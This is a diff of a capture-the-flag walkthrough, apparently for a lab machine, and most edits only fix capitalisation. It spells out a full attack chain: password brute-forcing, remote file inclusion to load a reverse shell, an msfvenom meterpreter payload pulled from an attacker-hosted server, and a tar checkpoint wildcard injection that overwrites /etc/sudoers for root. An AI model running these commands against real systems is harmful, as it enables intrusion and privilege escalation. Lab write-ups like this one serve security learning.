@@ -80,59 +80,63 @@ Reconnecting with SMB1 for workgroup listing.
 
 
 smbclient //IP/anonymous -U anonymous
-checking out the logs we got the password list 
+Checking out the logs we got the password list 
 
-now we have our username and a list of possible passwords, its time to fire up burpsuite
+Now we have our username and a list of possible passwords, its time to fire up burpsuite
 
 After running burpsuite intruder with the password list, the only one with a 302 redirect was --->    cyborg007haloterminator
 
-after logging into his email there was a file with his password for his smb share
+After logging into his email there was a file with his password for his smb share
 
-after checking out his notes/important.txt we are given a new directory to enumerate :    ----->    /45kra24zxs28v3yd
+After checking out his notes/important.txt we are given a new directory to enumerate :    ----->    /45kra24zxs28v3yd
 
 
 after enumerating this directory with gobuster again we find the /administator login to which is vulnerable to remote file inclusion letting us get a reverse shell on the server
 
 
-so a quick download from pentestmonkey's rev_shell.php and an edit in the file to place our IP in there and were onto the next step of what are some good RFI extentions
+so a quick download from pentestmonkey's rev_shell.php and an edit in the file to place our IP in there and were onto the next step of what are some good RFI extentions against Cuppa login
+
+I used exploit DB's below
+
+https://www.exploit-db.com/exploits/25971
 
 
-now we just have to serve the file on our side with python3 -m http.server 8080
+Now we just have to serve the file on our side with python3 -m http.server 8080
 
 
 45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=
 
-after the '=' we have to put the path to our payload we have on the server and set up the netcat listener on the port we chose
+After the '=' we have to put the path to our payload we have on the server and set up the netcat listener on the port we chose
 
 nc -lnvp 1234
 
-connection recieved! Hell yeah! alright, this shell is terrible, time for some meterpreter
+Cnnection recieved! Hell yeah! alright, this shell is terrible, time for some meterpreter
 
-generate a linux payload with msfvenom like so:
+Generate a linux payload with msfvenom like so:
 msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST="IP" LPORT="port" -f elf > whatever.elf
 
-now server another python server the same way and wget the file into the /tmp directory because it is world writeable
+Now server another python server the same way and wget the file into the /tmp directory because it is world writeable
 
 ##### keep in mind we should not close any of the netcat connections made leave all listeners open #######
 
-now we have a better shell, simply spawn a tty shell with python : 
+Now we have a better shell, simply spawn a tty shell with python : 
 python -c 'import pty; pty.spawn("/bin/sh")'
 then type 'bash' for a user shell with a path
 
-now we should enumerate the system with linpeas.sh 
+Now we should enumerate the system with linpeas.sh 
 
-doing so we dont really find much other than we can do some tar stuff, so technically anything in the directory getting tar'd will be ran
+Doing so we dont really find much other than we can do some tar stuff, so technically anything in the directory getting tar'd will be ran
 
-after some reading I decided the best route would be to see if i can overwrite the sudoers file with a ALL-(root) NOPASS: ALL for www-data
+After some reading I decided the best route would be to see if i can overwrite the sudoers file with a ALL-(root) NOPASS: ALL for www-data
 
-so lets echo 'echo "www-data ALL=(root) NOPASSWD: ALL" > /etc/sudoers' > esc.sh
+So lets echo 'echo "www-data ALL=(root) NOPASSWD: ALL" > /etc/sudoers' > esc.sh
 
-then some checkpoint stuff
+Then some checkpoint stuff
 
 echo "/var/www/html" > "--checkpoint-action=exec=sh esc.sh"
 echo "/var/www/html" > --checkpoint=1
 
-then we just have to set up out listener and wait!!
+Then we just have to set up out listener and wait!!
 
-
+Happy Hacking!
 
